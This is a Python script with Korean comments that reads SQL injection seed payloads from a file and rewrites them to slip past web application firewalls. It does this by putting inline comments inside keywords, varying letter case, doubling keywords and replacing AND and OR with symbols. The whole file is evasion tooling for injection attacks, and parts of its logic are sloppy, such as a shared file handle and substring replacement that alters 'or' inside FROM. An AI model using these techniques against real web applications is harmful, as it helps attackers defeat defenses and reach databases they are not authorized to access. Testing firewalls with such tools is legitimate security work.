# FileName: WAF_BYPASS.py
# Author: Seung Hun Han
# 
# 기존 조사한 시드파일에 WAF우회기법을 적용해 WAF BYPASS를 시도하는 함수 집합이다. 
# KEYWORD에 우회를 원하는 키워드를 사전 입력 할것.

keyword = [
    "SELECT",
    "OR",
    "AND",
    "PRINT",
    "INSERT",
    "DELETE",
    "UPDATE",
    "REPLACE",
    "UNION",
    "FROM",
    "TRUE",
    "FALSE",
    "select",
    "or",
    "and",
    "print",
    "insert",
    "delete",
    "update",
    "replace",
    "union",
    "from",
    "true",
    "false"
]

# 주석처리기법
def wafBypassComment(outputName, inputFile):
    outputFile = open(outputName, 'w')
    while True:
        line = inputFile.readline()
        if not line: break

        for k in keyword:
            nk = k[:1] + "/**/" + k[1:]
            line = line.replace(k, nk)
        outputFile.write(line)

#대소문자 혼용 & 변경 기법
def wafBypassCase(outputName, inputFile):
    outputFile = open(outputName, 'w')
    while True:
        line = inputFile.readline()
        if not line: break
        tempLine = line

        newKeyword = []
        for k in keyword:
            if line.find(k) != -1:
                newKeyword.append(k)

        #print(newKeyword)
        for k in newKeyword:
            nk1 = k.upper()
            tempLine = tempLine.replace(k, nk1)
        if newKeyword != []: outputFile.write(tempLine)

        tempLine = line

        for k in newKeyword:
            nk2 = k.lower()
            tempLine = tempLine.replace(k, nk2)
        if newKeyword != []: outputFile.write(tempLine)

        tempLine = line

        for k in newKeyword:
            nk3 = k.capitalize()
            tempLine = tempLine.replace(k, nk3)
        if newKeyword != []: outputFile.write(tempLine)

# 키워드 대체기법
def wafBypassKeyword(outputName, inputFile):
    outputFile = open(outputName, 'w')
    while True:
        line = inputFile.readline()
        if not line: break
        tempLine = line

        newKeyword = []
        for k in keyword:
            if line.find(k) != -1 and k == k.upper():
                newKeyword.append(k)

        for k in newKeyword:
            nk = k[:1] + k.lower() + k[1:]
            tempLine = tempLine.replace(k, nk)
        if newKeyword != []: outputFile.write(tempLine)

# 특수 키워드 대체 기법
def wafBypassFilteringKey(outputName, inputFile):
    outputFile = open(outputName, 'w')
    keyword_local = ["and", "AND", "or", "OR", "union", "UNION"]
    while True:
        line = inputFile.readline()
        if not line: break
        newLine = line

        newKeyword = []
        for k in keyword_local:
            if line.find(k) != -1:
                newKeyword.append(k)

        for k in newKeyword:
            sym = ""
            if k == "and" or k == "AND": sym="&&"
            else: sym="||"
            newLine = newLine.replace(k, sym)

        if newKeyword != []: outputFile.write(newLine)
       
        


f = open("SQL.txt", 'r')

#wafBypassComment("temp1.txt", f)
#wafBypassCase("temp2.txt", f)
#wafBypassKeyword("temp3.txt", f)
#afBypassFilteringKey("temp4.txt", f)
